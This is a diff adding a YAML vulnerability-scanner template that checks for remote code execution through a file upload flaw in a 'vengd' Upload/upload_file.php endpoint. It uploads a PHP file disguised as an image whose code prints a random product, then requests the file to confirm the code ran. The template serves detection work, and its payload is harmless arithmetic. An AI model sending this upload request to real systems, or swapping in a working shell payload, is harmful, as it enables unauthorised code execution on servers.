@@ -1,0 +1,25 @@
+name: poc-yaml-vengd-upload-rce
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+  r3: randomInt(40000, 44800)
+  r4: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /Upload/upload_file.php?l={{r1}}
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+    body: |-
+      ------WebKitFormBoundaryfcKRltGv
+      Content-Disposition: form-data; name="file"; filename="{{r2}}.php"
+      Content-Type: image/avif
+      <?php print({{r3}} * {{r4}}); ?>
+      ------WebKitFormBoundaryfcKRltGv--
+    expression: response.status == 200 && response.body.bcontains(b"_Request:")
+  - method: GET
+    path: '/Upload/{{r1}}/{{r2}}.php'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r3 * r4)))
+detail:
+  author: jingling(https://github.com/shmilylty)
+  links:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
